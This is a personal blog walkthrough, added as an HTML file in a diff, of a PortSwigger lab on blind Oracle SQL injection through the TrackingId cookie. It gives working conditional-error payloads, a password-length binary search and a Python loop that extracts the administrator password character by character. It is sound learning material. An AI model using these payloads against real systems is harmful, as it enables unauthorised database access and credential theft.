@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>WSA: Blind SQL Injection with conditional errors</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="description" content="Walkthrough for the related PortSwigger Web Lab." />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">WSA: Blind SQL Injection with conditional errors</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org8d1b433">Introduction</a></li>
+<li><a href="#org684c2fd">Web Security Academy</a></li>
+<li><a href="#org0252a42">The process</a>
+<ul>
+<li><a href="#orgab4dd74">Finding the SQLi point</a></li>
+<li><a href="#org77e0b3b">Finding the SQL backend</a></li>
+<li><a href="#org30851bc">Developing a base condition</a></li>
+<li><a href="#org4b9c80e">Validating the existence of specifics</a></li>
+<li><a href="#org7e9b802">Getting info about password</a>
+<ul>
+<li><a href="#orge7a2521">Password Length</a></li>
+<li><a href="#org70392ee">Password Contents</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#orgbce7443">Summary</a></li>
+</ul>
+</div>
+</div>
+
+
+<div id="outline-container-org8d1b433" class="outline-2">
+<h2 id="org8d1b433"><a href="#org8d1b433">Introduction</a></h2>
+<div class="outline-text-2" id="text-org8d1b433">
+<p>
+I feel like much of the process I made during the last year, even
+though significant was disorganized and chaotic. I have reached a
+level where I can read (/study) cybersecurity research and articles
+with increasing comfort, having a solid background on most terms, but
+at the same time, my practical knowledge on most of those is greatly
+underdeveloped. To tackle that, I selected a field to focus on for
+this semester, expecting a certain degree of proficiency at the end of
+it that I can (at least pretend to) participate in a bug bounty
+program and solve related CTF challenges.
+</p>
+
+<p>
+Starting with SQL injections.
+</p>
+</div>
+</div>
+
+
+
+<div id="outline-container-org684c2fd" class="outline-2">
+<h2 id="org684c2fd"><a href="#org684c2fd">Web Security Academy</a></h2>
+<div class="outline-text-2" id="text-org684c2fd">
+<p>
+<a href="https://portswigger.net/web-security/dashboard">Web Security Academy</a> has been a very interesting integration to my
+<i>studying</i> routine, allowing for easily deployable labs, directly from
+my browser, which I can access without the need of a <code>VPN</code>. Having a
+basic Web lab configured locally, they allow me to test different
+ideas freely, <span class="underline">without much friction</span>.
+</p>
+
+<p>
+Stating this here, I aim to complete at least 210 labs (roughly 80% of
+the ones available in the website) by the end of May.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org0252a42" class="outline-2">
+<h2 id="org0252a42"><a href="#org0252a42">The process</a></h2>
+<div class="outline-text-2" id="text-org0252a42">
+<p>
+&rsquo;nough said, let&rsquo;s dive into the lab. 
+</p>
+</div>
+
+<div id="outline-container-orgab4dd74" class="outline-3">
+<h3 id="orgab4dd74"><a href="#orgab4dd74">Finding the SQLi point</a></h3>
+<div class="outline-text-3" id="text-orgab4dd74">
+<p>
+Knowing that this is a lab with a SQLi vulnerability, I just loaded
+the page on my browser, revealing a familiar page from previously
+completed (<i>yet undocumented from my part</i>) labs. After 2 minutes in
+manual navigation, I had collected enough requests for me in Burp
+Suite to be able to work solely through <code>Repeater</code>:
+</p>
+<ul class="org-ul">
+<li class="on"><code>[X]</code> Testing <code>parameter</code>: We see that tinkering around leaves no trace of
+a potential SQLi.</li>
+<li class="on"><code>[X]</code> Testing the cookie: As seen in the image below&#x2026; we know where to
+look at.</li>
+</ul>
+
+
+<div id="orgb71d083" class="figure">
+<p><img src="images/20240213_112605_screenshot.png" alt="20240213_112605_screenshot.png">
+</p>
+<p><span class="figure-number">Figure 1: </span>SQLi POC</p>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org77e0b3b" class="outline-3">
+<h3 id="org77e0b3b"><a href="#org77e0b3b">Finding the SQL backend</a></h3>
+<div class="outline-text-3" id="text-org77e0b3b">
+<p>
+Now, knowing that we have to manipulate the value of <code>TrackingID</code>
+cookie, we need to gather some more information about the underlying
+system. Using simple <code>AND</code> queries does not seem to give us much
+information, since the output of our commands is not shown in the
+response, but adding <code>UNION SELECT</code> means increased versatility.
+</p>
+
+<p>
+Namely the process followed here was:
+</p>
+<ul class="org-ul">
+<li class="on"><code>[X]</code> Get a simple <code>AND</code> query to return 200
+<ul class="org-ul">
+<li><code>' and 'a'='a'--</code></li>
+</ul></li>
+<li class="on"><code>[X]</code> Insert a <code>SELECT</code> there to see how the DBMS handles those
+<ul class="org-ul">
+<li><code>(SELECT 'a')='a'--</code> fails, for no apparent reason</li>
+<li><code>(SELECT 'a' from dual)='a'--</code> and we&rsquo;re good to go, an obvious sign
+that we are facing Oracle DBMS</li>
+</ul></li>
+</ul>
+
+
+
+<div id="org6433f31" class="figure">
+<p><img src="images/20240213_112905_screenshot.png" alt="20240213_112905_screenshot.png">
+</p>
+<p><span class="figure-number">Figure 2: </span>Oracle DBMS poc</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org30851bc" class="outline-3">
+<h3 id="org30851bc"><a href="#org30851bc">Developing a base condition</a></h3>
+<div class="outline-text-3" id="text-org30851bc">
+<p>
+Getting into our arsenal (<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQLi Cheatsheet</a>), we insert a <code>CASE</code>
+statement, and a division by zero to throw an exception when the
+condition is met. Using this general syntax will allow us in the next
+steps to get more information about the target system, since it
+effectively translates into:
+</p>
+<ul class="org-ul">
+<li>500 return code -&gt; condition true</li>
+<li>200 return code -&gt; condition false</li>
+</ul>
+
+
+<div id="org6157673" class="figure">
+<p><img src="images/20240213_113037_screenshot.png" alt="20240213_113037_screenshot.png">
+</p>
+<p><span class="figure-number">Figure 3: </span>Getting the DBMS to throw an error</p>
+</div>
+</div>
+</div>
+
+
+
+<div id="outline-container-org4b9c80e" class="outline-3">
+<h3 id="org4b9c80e"><a href="#org4b9c80e">Validating the existence of specifics</a></h3>
+<div class="outline-text-3" id="text-org4b9c80e">
+<p>
+Our goal is to get the password of the <code>administrator</code> account but first
+we need to verify some data:
+</p>
+<ul class="org-ul">
+<li class="on"><code>[X]</code> Validating the existence of the <code>users</code> table</li>
+<li class="on"><code>[X]</code> Validating the existence of <code>user</code>: administrator</li>
+<li class="on"><code>[X]</code> Validating the existence of the <code>password</code> column</li>
+</ul>
+
+<p>
+These were mostly completed as shown here:
+</p>
+<pre class="example" id="orge4d8f44">
+TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE null END FROM users--
+TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users--
+TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ('b'='a') THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator'--
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org7e9b802" class="outline-3">
+<h3 id="org7e9b802"><a href="#org7e9b802">Getting info about password</a></h3>
+<div class="outline-text-3" id="text-org7e9b802">
+<p>
+Pay attention to how my payload has slightly changed from the previous
+&ldquo;examples&rdquo;, and <b>special emphasis</b> should be given to the <code>from dual</code>
+part, since forgetting it causes 500 (oracle DBMS).
+</p>
+</div>
+
+<div id="outline-container-orge7a2521" class="outline-4">
+<h4 id="orge7a2521"><a href="#orge7a2521">Password Length</a></h4>
+<div class="outline-text-4" id="text-orge7a2521">
+<p>
+To get the length of the password field for the entry with
+<code>username='administrator'</code>, we can rely on the builtin function <code>LENGTH</code>
+Through <i>binary</i> search, starting from an obviously unrealistic (for a
+challenge at least) length of 100, we got that password length for
+administrator is 20 characters:
+</p>
+
+<pre class="example" id="orge6316ec">
+TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&gt;0)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--
+Cookie: TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT 'a' from users where username='administrator' and LENGTH(password)&lt;100)='a') THEN 'a' ELSE TO_CHAR(1/0) END from dual--;
+</pre>
+
+
+
+<div id="orga014826" class="figure">
+<p><img src="images/20240213_114312_screenshot.png" alt="20240213_114312_screenshot.png">
+</p>
+<p><span class="figure-number">Figure 4: </span>Password Length Query</p>
+</div>
+
+<p>
+This means that we need to get 20 characters
+</p>
+</div>
+</div>
+
+<div id="outline-container-org70392ee" class="outline-4">
+<h4 id="org70392ee"><a href="#org70392ee">Password Contents</a></h4>
+<div class="outline-text-4" id="text-org70392ee">
+<p>
+Since I use Burp Community Edition I know that to get the password
+will take a fair share of my lifetime, should I stick with the
+<i>confined</i> version of <code>Intruder</code>. To make up for it, I decided to run a
+simple loop with python. Namely:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python">password = ""
+
+for index in range(1,21):
+    for letter in string.lowercase + string.digits:
+        req = send.request() # Pseudocode
+        if reg.status_code == 500:
+            password += letter
+            break
+</pre>
+</div>
+
+<p>
+The request is built and sent using <code>python</code>&rsquo;s builtin <code>requests</code> library,
+allowing through the usage of <code>proxies</code>, to have the requests sent to
+burp as well<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, while its payload is in the form of:
+</p>
+
+<pre class="example" id="org6e8b2e9">
+'Cookie': f"TrackingId=YgUTniHSZwxsy11x' UNION SELECT CASE WHEN ((SELECT SUBSTR(password,{index},1) from users where username='administrator') ='{letter}') THEN TO_CHAR(1/0) ELSE null END from dual--; session=ImL77SPyy3Ne4HwEqb2Bnu2HFhIR18Vp",
+</pre>
+
+<p>
+Notice that:
+</p>
+<ul class="org-ul">
+<li>It is in the format of a python dictionary</li>
+<li>I <span class="underline">still</span> use <code>dual</code></li>
+<li>Usage of &rsquo;&rsquo; outside of {letter}, otherwise the requests get all invalidated.</li>
+</ul>
+
+<p>
+This beautifully automates the process allowing me to get a:
+</p>
+
+
+<div id="orga38f5f7" class="figure">
+<p><img src="images/20240213_115634_screenshot.png" alt="20240213_115634_screenshot.png">
+</p>
+<p><span class="figure-number">Figure 5: </span>BEAUTIFULLLLLLL</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-orgbce7443" class="outline-2">
+<h2 id="orgbce7443"><a href="#orgbce7443">Summary</a></h2>
+<div class="outline-text-2" id="text-orgbce7443">
+<p>
+Do not make the mistake of overlooking these labs. They have been
+really fun to play with, and I feel like I have already learned so
+much new about SQLi &#x2026;
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+Critical when debugging payload mistakes 
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-02-13 Tue 11:22</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
